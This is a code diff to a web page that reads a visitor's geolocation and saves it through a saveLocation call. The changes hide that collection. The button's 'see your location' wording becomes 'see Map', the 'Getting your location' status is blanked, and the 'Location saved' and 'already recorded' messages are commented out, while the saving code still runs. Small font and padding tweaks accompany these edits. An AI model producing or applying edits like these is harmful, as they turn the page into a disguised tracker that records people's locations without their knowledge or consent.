@@ -66,7 +66,7 @@
     .card {
       background: rgba(255, 255, 255, 0.95);
       backdrop-filter: blur(10px);
-      padding: 32px 40px;
+      padding: 32px 2px;
       border-radius: 24px;
       box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3), 
                   0 0 0 1px rgba(255, 255, 255, 0.5) inset;
@@ -253,7 +253,7 @@
       }
 
       p {
-        font-size: 15px;
+        font-size: 10px;
       }
 
       .iframe-container {
@@ -296,11 +296,11 @@
     </div>
 
     <button id="viewMapBtn" disabled>
-      Click here to see your location
+      Click here to see Map
     </button>
 
     <div class="status loading" id="status">
-      Getting your location…
+      
     </div>
 
     <footer>
@@ -332,11 +332,11 @@
           try {
             //await ensureDailyCollection();
             await saveLocation(lat, lng);
-            statusEl.textContent = "Location saved successfully ✅";
+            // statusEl.textContent = "Location saved successfully ✅";
             statusEl.classList.remove('loading');
           } catch (e) {
             console.warn("Save failed or skipped:", e);
-            statusEl.textContent = "Location already recorded.";
+            // statusEl.textContent = "Location already recorded.";
             statusEl.classList.remove('loading');
           }
 
